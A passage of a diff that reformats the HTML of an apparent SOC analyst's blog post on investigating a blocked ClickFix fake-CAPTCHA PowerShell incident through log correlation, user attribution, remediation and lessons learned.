+        <strong>4104</strong>) showed the activity on the host, but no other
+        signs of compromise before or after.
+      </p>
 
-    <p>At this point, we'd confirmed PowerShell was launched directly from the Windows Run box. This raised two critical follow-up questions:</p>
+      <p>
+        At this point, we'd confirmed PowerShell was launched directly from the
+        Windows Run box. This raised two critical follow-up questions:
+      </p>
 
-    <ol>
-      <li><strong>Who or what ran it in the Run box?</strong></li>
-      <li><strong>Was the download successful?</strong></li>
-    </ol>
+      <ol>
+        <li><strong>Who or what ran it in the Run box?</strong></li>
+        <li><strong>Was the download successful?</strong></li>
+      </ol>
 
-    <h3>e. Threat Intel Correlation</h3>
+      <h3>e. Threat Intel Correlation</h3>
 
-    <p>
-      Our threat intel team reported back that this URL, along with similar TTPs, was a known
-      characteristic of the <strong>ClickFix campaign</strong> — where threat actors use fake CAPTCHA
-      pages to social-engineer victims into copying and pasting a malicious command into the Windows Run
-      box, under the guise of "verifying" they're human.
-    </p>
+      <p>
+        Our threat intel team reported back that this URL, along with similar
+        TTPs, was a known characteristic of the
+        <strong>ClickFix campaign</strong> — where threat actors use fake
+        CAPTCHA pages to social-engineer victims into copying and pasting a
+        malicious command into the Windows Run box, under the guise of
+        "verifying" they're human.
+      </p>
 
-    <img src="/assets/images/PICERL/8.png" alt="Fake CAPTCHA — Verify You Are Human Prompt" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <img
+        src="/assets/images/PICERL/8.png"
+        alt="Fake CAPTCHA — Verify You Are Human Prompt"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <img src="/assets/images/PICERL/9.png" alt="ClickFix — Complete These Verification Steps instructions" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <img
+        src="/assets/images/PICERL/9.png"
+        alt="ClickFix — Complete These Verification Steps instructions"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>Priority shifted to determining whether the download succeeded, and if so, what post-compromise activity we should be hunting for.</p>
+      <p>
+        Priority shifted to determining whether the download succeeded, and if
+        so, what post-compromise activity we should be hunting for.
+      </p>
 
-    <p><strong>Confirming download status:</strong></p>
+      <p><strong>Confirming download status:</strong></p>
 
-    <ul>
-      <li><strong>Defender logs</strong> — checked first for a successful download vs. a block. Defender reported the connection as <strong>blocked</strong>.</li>
-      <li><strong>Sysmon</strong> — confirmed no File Create events (Event ID <strong>11</strong>) for that host during the relevant time window.</li>
-      <li><strong>Zeek conn logs</strong> — checked for any TCP connection to the destination IP or associated CDN/ASN ranges during that window. None were observed.</li>
-    </ul>
+      <ul>
+        <li>
+          <strong>Defender logs</strong> — checked first for a successful
+          download vs. a block. Defender reported the connection as
+          <strong>blocked</strong>.
+        </li>
+        <li>
+          <strong>Sysmon</strong> — confirmed no File Create events (Event ID
+          <strong>11</strong>) for that host during the relevant time window.
+        </li>
+        <li>
+          <strong>Zeek conn logs</strong> — checked for any TCP connection to
+          the destination IP or associated CDN/ASN ranges during that window.
+          None were observed.
+        </li>
+      </ul>
 
-    <img src="/assets/images/PICERL/10.png" alt="Microsoft Defender for Cloud Apps — Download Blocked" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <img
+        src="/assets/images/PICERL/10.png"
+        alt="Microsoft Defender for Cloud Apps — Download Blocked"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p><strong>Finding:</strong> the download attempt was successfully blocked, with no evidence of payload execution or file creation on disk.</p>
+      <p>
+        <strong>Finding:</strong> the download attempt was successfully blocked,
+        with no evidence of payload execution or file creation on disk.
+      </p>
 
-    <p><strong>Confirming origin of the command:</strong></p>
+      <p><strong>Confirming origin of the command:</strong></p>
 
-    <p>
-      Since ClickFix relies on a human following fake on-screen instructions, we needed to confirm which
-      user was responsible. I correlated:
-    </p>
+      <p>
+        Since ClickFix relies on a human following fake on-screen instructions,
+        we needed to confirm which user was responsible. I correlated:
+      </p>
 
-    <ul>
-      <li>Defender sign-in/session data</li>
-      <li>Windows Event IDs <strong>4624</strong> (logon, Type 2 — interactive), <strong>11</strong>, and <strong>13</strong></li>
-    </ul>
+      <ul>
+        <li>Defender sign-in/session data</li>
+        <li>
+          Windows Event IDs <strong>4624</strong> (logon, Type 2 — interactive),
+          <strong>11</strong>, and <strong>13</strong>
+        </li>
+      </ul>
 
-    <img src="/assets/images/PICERL/11.png" alt="Windows Event 4624 — Interactive Logon Properties" />
-    <p><em>This image does not reflect the actual incident but is an open source image used to reenact what happened on the client environment.</em></p>
+      <img
+        src="/assets/images/PICERL/11.png"
+        alt="Windows Event 4624 — Interactive Logon Properties"
+      />
+      <p>
+        <em
+          >This image does not reflect the actual incident but is an open source
+          image used to reenact what happened on the client environment.</em
+        >
+      </p>
 
-    <p>
-      Only one user account had been active on the device at the relevant time, with no corresponding
-      logoff event — confirming that user was logged in and present when the command executed. From
-      there, we needed to determine what site the user had visited that led to this action.
-    </p>
+      <p>
+        Only one user account had been active on the device at the relevant
+        time, with no corresponding logoff event — confirming that user was
+        logged in and present when the command executed. From there, we needed
+        to determine what site the user had visited that led to this action.
+      </p>
 
-    <p>
-      We reviewed web history in Defender and identified a site visited shortly before the activity,
-      with the timing aligning closely against both the alert timestamp and the RunMRU registry
-      timestamp. Finally, I consulted directly with the user about their browsing activity around that
-      time — their account matched what we'd already found, including the compromised site itself.
-    </p>
+      <p>
+        We reviewed web history in Defender and identified a site visited
+        shortly before the activity, with the timing aligning closely against
+        both the alert timestamp and the RunMRU registry timestamp. Finally, I
+        consulted directly with the user about their browsing activity around
+        that time — their account matched what we'd already found, including the
+        compromised site itself.
+      </p>
 
-    <p>
-      <strong>Conclusion:</strong> the user had visited a compromised site and was social-engineered via
-      a fake CAPTCHA prompt into copying and pasting a malicious command into the Windows Run box, which
-      triggered the alert.
-    </p>
+      <p>
+        <strong>Conclusion:</strong> the user had visited a compromised site and
+        was social-engineered via a fake CAPTCHA prompt into copying and pasting
+        a malicious command into the Windows Run box, which triggered the alert.
+      </p>
 
-    <h2>4. Eradication / Remediation</h2>
+      <h2>4. Eradication / Remediation</h2>
 
-    <p>
-      We conducted additional analysis on the device to rule out any other signs of compromise —
-      reviewing web history, downloads, and Prefetch files for application execution. No additional red
-      flags were identified.
-    </p>
+      <p>
+        We conducted additional analysis on the device to rule out any other
+        signs of compromise — reviewing web history, downloads, and Prefetch
+        files for application execution. No additional red flags were
+        identified.
+      </p>
 
-    <h2>5. Recovery</h2>
+      <h2>5. Recovery</h2>
 
-    <p>
-      As a precaution, we recommended the customer reimage the device to a known-good baseline before
-      returning it to the network, and offered to assist with user-level security awareness training on
-      this specific attack technique.
-    </p>
+      <p>
+        As a precaution, we recommended the customer reimage the device to a
+        known-good baseline before returning it to the network, and offered to
+        assist with user-level security awareness training on this specific
+        attack technique.
+      </p>
 
-    <h2>6. Lessons Learned</h2>
+      <h2>6. Lessons Learned</h2>
 
-    <p>
-      As a SOC team, we synced with the incident handlers and threat intel analysts to run a roundtable
-      on findings and research from this incident, focused on its value for future IOC development and
-      detection logic. This incident also gave us the opportunity to:
-    </p>
+      <p>
+        As a SOC team, we synced with the incident handlers and threat intel
+        analysts to run a roundtable on findings and research from this
+        incident, focused on its value for future IOC development and detection
+        logic. This incident also gave us the opportunity to:
+      </p>
 
-    <ul>
-      <li>Refine our playbooks to better distinguish user-initiated vs. non-user-initiated PowerShell activity</li>
-      <li>Run a crash course for DFIR personnel on RunMRU key analysis, web artifact review, and Prefetch examination</li>
-      <li>Analyzed investigation timeline for improvements</li>
-    </ul>
+      <ul>
+        <li>
+          Refine our playbooks to better distinguish user-initiated vs.
+          non-user-initiated PowerShell activity
+        </li>
+        <li>
+          Run a crash course for DFIR personnel on RunMRU key analysis, web
+          artifact review, and Prefetch examination
+        </li>
+        <li>Analyzed investigation timeline for improvements</li>
+      </ul>
 
-    <p>
-      While this wasn't a full domain compromise, I think it's a strong, realistic example of the kind
-      of alert triage and incident response work a SOC team handles on a regular basis — and a good
-      demonstration of how seemingly "routine" PowerShell alerts can require real forensic depth to
-      properly attribute and close out.
-    </p>
+      <p>
+        While this wasn't a full domain compromise, I think it's a strong,
+        realistic example of the kind of alert triage and incident response work
+        a SOC team handles on a regular basis — and a good demonstration of how
+        seemingly "routine" PowerShell alerts can require real forensic depth to
+        properly attribute and close out.
+      </p>
 
-    <hr />
+      <hr />
 
-    <h2>References</h2>
+      <h2>Great Articles into ClickFix</h2>
 
-    <ul>
-      <li><a href="https://www.microsoft.com/en-us/security/blog/2024/05/16/click-fix-social-engineering-technique-uses-fake-captcha-pages-to-trick-users/" target="_blank" rel="noopener">Microsoft Security Blog — ClickFix: How to Infect Your PC in Three Easy Steps</a></li>
-      <li><a href="https://www.splunk.com/en_us/blog/security/clickfix-campaign-technical-analysis.html" target="_blank" rel="noopener">Splunk Threat Research — ClickFix Campaign Technical Analysis</a></li>
-    </ul>
+      <ul>
+        <li>
+          <a
+            href="https://www.microsoft.com/en-us/security/blog/2024/05/16/click-fix-social-engineering-technique-uses-fake-captcha-pages-to-trick-users/"
+            target="_blank"
+            rel="noopener"
+            >Microsoft Security Blog — ClickFix: How to Infect Your PC in Three
+            Easy Steps</a
+          >
+        </li>
+        <li>
+          <a
+            href="https://www.splunk.com/en_us/blog/security/clickfix-campaign-technical-analysis.html"
+            target="_blank"
+            rel="noopener"
+            >Splunk Threat Research — ClickFix Campaign Technical Analysis</a
+          >
+        </li>
+      </ul>
+    </article>
 
-  </article>
-
-  <script src="/assets/js/post.js"></script>
-</body>
+    <script src="/assets/js/post.js"></script>
+  </body>
 </html>
